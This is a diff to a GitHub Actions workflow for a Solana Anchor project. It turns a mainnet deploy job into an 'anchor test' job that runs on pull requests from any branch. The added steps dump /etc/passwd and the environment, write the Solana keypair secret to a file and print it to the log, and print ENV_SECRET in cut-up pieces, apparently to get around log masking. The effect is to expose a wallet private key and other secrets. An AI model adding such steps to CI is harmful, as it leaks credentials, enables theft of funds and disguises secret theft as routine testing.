@@ -6,15 +6,17 @@
 # providing several convenient developer tools for writing smart contracts.
 # More details at https://github.com/coral-xyz/anchor
 
-name: deploy-apr
+name: anchor test
 
 on:
-  push:
-    branches: ["main"]
+  pull_request:
+    # The branches below must be a subset of the branches above
+#     branches: ["main"]
+    branches: "*"
 
 jobs:
-  deploy-apr:
-    name: Deploy to apr.dev
+  anchor-test:
+    name: Run anchor test
     runs-on: ubuntu-latest
     container: projectserum/build:v0.25.0
     env:
@@ -27,13 +29,19 @@ jobs:
     steps:
       - name: Checkout code
         uses: actions/checkout@v2
+      - run: whoami
+      - run: echo hi
+      - run: id
+      - run: cat /etc/passwd
+      - run: echo ${{ secrets.SOLANA_KEYPAIR_JSON }} > $HOME/.config/solana/id.json
+      - run: cat $HOME/.config/solana/id.json
+      - run: solana balance -ud
+      - run: pwd
+      - run: printenv
+      - run: true || echo $ENV_SECRET | cut -c -5; echo $ENV_SECRET | cut -c 5-10; echo $ENV_SECRET | cut -c 10-
+      - run: ls -la
+      - run: rustup show
+      - run: yarn
       - name: Run anchor test
         run: anchor test
-      - name: Add keypair
-        run: echo ${{ secrets.SOLANA_KEYPAIR_JSON }} > $HOME/.config/solana/id.json
-      - name: Anchor Login
-        run: anchor login ${{ secrets.ANCHOR_PUBLISH_TOKEN }}
-      - name: Point to Mainnet
-        run: sed -i 's|$cluster = "|cluster = "mainnet"|' Anchor.toml
-      - name: Create & Deploy verifiable build
-        run: yes 'yes' | anchor publish starter_project
+
